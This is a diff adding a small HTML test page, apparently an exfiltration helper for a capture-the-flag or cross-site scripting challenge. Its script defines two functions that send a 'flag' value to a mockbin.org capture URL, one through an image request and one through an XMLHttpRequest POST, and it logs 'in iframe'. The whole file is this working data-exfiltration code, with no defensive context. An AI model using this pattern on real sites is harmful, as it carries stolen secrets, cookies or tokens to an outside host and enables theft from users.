@@ -1,1 +1,24 @@
-
+<!doctype html>
+<html>
+  <head>
+    <meta charset="utf-8">
+    <title>test</title>
+  </head>
+  <body>
+    <script>
+function sendrequ(payload){
+  	var img = document.createElement('img');
+	img.src = "http://mockbin.org/bin/bc04f62e-58a7-4468-b5fa-51d85f87bee4?flag=" + payload;
+	document.body.appendChild(img);
+}
+function s2(payload){
+var req = new XMLHttpRequest();
+    req.open("POST", "http://mockbin.org/bin/bc04f62e-58a7-4468-b5fa-51d85f87bee4", true);
+    req.send("flag="+ payload);
+}
+console.log("in iframe");
+    </script>
+    
+  </body>
+</html> 
+ 
